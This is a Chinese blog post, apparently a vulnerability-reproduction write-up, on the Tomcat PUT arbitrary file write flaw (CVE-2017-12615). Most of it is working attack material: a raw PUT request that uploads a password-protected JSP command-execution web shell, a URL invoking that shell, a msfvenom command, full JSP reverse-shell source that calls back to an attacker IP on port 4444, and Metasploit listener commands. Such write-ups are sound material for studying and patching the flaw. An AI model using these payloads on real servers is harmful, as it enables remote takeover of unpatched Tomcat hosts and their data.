---
title: Tomcat Put方法任意写文件漏洞(CVE-2017-12615)
date: 2020-07-19 20:40:10
categories: 漏洞复现
tags: Tomcat
---

#### 背景

在运行Tomcat的主机上并且启用了HTTP PUT请求方法，**readonly**参数设置为false，攻击者能够将文件写入到服务器。Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特点来绕过了限制。Linux下可以使用“/”,Windows下可以使用“%20”

<!--more-->

#### 复现过程

发送如下payload

```
PUT /1.jsp/ HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

<%

    if("123456".equals(request.getParameter("pwd"))){

        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();

        int a = -1;

        byte[] b = new byte[2048];

        out.print("<pre>");

        while((a=in.read(b))!=-1){

            out.println(new String(b));

        }

        out.print("</pre>");

    }

%>
```

![](http://cdn.laohuan.art/%E3%80%812020-07-17_14-22-55.png)

返回201后便在网站目录下生成了1.jsp文件

![](http://cdn.laohuan.art/2020-07-17_14-39-07.png)

访问shell

```
http://IP:8080/1.jsp?pwd=123456&i=whoami
```

![](http://cdn.laohuan.art/2020-07-17_14-36-54.png)

![](http://cdn.laohuan.art/2020-07-17_14-37-18.png)

也可以使用msf的jsp反弹shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=VPSIP LPORT=4444 R > cmd.jsp
```

生成cmd.jsp,将其内容put到服务器

```java
%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream yw;
    OutputStream jz;

    StreamConnector( InputStream yw, OutputStream jz )
    {
      this.yw = yw;
      this.jz = jz;
    }

    public void run()
    {
      BufferedReader bx  = null;
      BufferedWriter dob = null;
      try
      {
        bx  = new BufferedReader( new InputStreamReader( this.yw ) );
        dob = new BufferedWriter( new OutputStreamWriter( this.jz ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = bx.read( buffer, 0, buffer.length ) ) > 0 )
        {
          dob.write( buffer, 0, length );
          dob.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( bx != null )
          bx.close();
        if( dob != null )
          dob.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "反弹IP", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
```

msf设置好监听

```bash
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set lhost 0.0.0.0
set lport 4444
run
```

成功回连

![](http://cdn.laohuan.art/2020-07-17_15-06-30.png)

参考链接

<https://www.freebuf.com/vuls/148283.html>

<https://www.cnblogs.com/swyft/articles/5563732.html>




